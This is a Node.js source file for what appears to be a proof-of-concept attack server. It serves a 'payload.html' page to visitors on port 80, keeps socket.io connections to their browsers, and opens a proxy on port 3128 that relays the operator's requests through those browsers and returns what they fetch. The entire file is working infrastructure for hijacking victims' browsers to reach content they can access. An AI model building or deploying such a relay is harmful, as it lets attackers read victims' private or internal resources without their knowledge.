const fs = require('fs');
const http = require('http');
const io = require('socket.io');

var htmlPayload = fs.readFileSync(__dirname + '/payload.html');

var pendings = { __proto__: null };
var serialId = 0;
var connectedIo = [];
var currentIndex = 0;

var pubServer = http.createServer(function(request, response) {
	if (request.method !== 'GET') {
		response.writeHead(501, 'Not Implemented');
		response.write('Not Implemented');
		response.end();
		return;
	}

	response.writeHead(200, 'OK', {
		"Content-Type": "text/html",
		"Content-Length": htmlPayload.length
	})
	response.write(htmlPayload);
	response.end();
});
var pubIo = io(pubServer).of('/websocket');
pubIo.on('connection', function(socket) {
	socket.__resps = [];

	socket.on('poc response', function(requestId, ok, type, data) {
		var pending = pendings[requestId];
		if (!pending) {
			return;
		}

		console.log(`ON Response ${requestId} -- ${ok}, ${type}, [${data.length}]`);
		if (ok) {
			pending.writeHead(200, 'OK', {
				"Content-Type": type,
				"Content-Length": data.length
			});
		} else {
			pending.writeHead(500, 'Internal Server Error', {
				"Content-Type": "text/plain",
				"Content-Length": data.length
			});
		}
		pending.write(data);
		pending.end();

		delete pendings[requestId];
		var index = socket.__resps.indexOf(pending);
		socket.__resps.splice(index, 1);
	});
	socket.on('disconnect', function() {
		var index = connectedIo.indexOf(socket);
		connectedIo.splice(index, 1);
		currentIndex--;
		if (currentIndex < 0) {
			currentIndex = 0;
		}

		for (let response of socket.__resps) {
			response.writeHead(502, 'Bad Gateway');
			response.write('Peer Disconnected');
			response.end();
		}
	});

	connectedIo.push(socket);
});
pubServer.listen(80);

var priServer = http.createServer(function(request, response) {
	if (request.method !== 'GET') {
		response.writeHead(501, 'Not Implemented');
		response.write('Not Implemented');
		response.end();
		return;
	}

	if (connectedIo.length < 1) {
		response.writeHead(503, 'Service Unavailable');
		response.write('No connected peers');
		response.end();
		return;
	}

	var socket = connectedIo[currentIndex];

	pendings[serialId] = response;
	socket.__resps.push(response);
	console.log(`EMIT Request ${serialId} -- ${currentIndex} ${request.url}`);
	socket.emit('poc request', serialId, request.url);
	serialId++;

	currentIndex++;
	if (currentIndex >= connectedIo.length) {
		currentIndex = 0;
	}
});
priServer.listen(3128);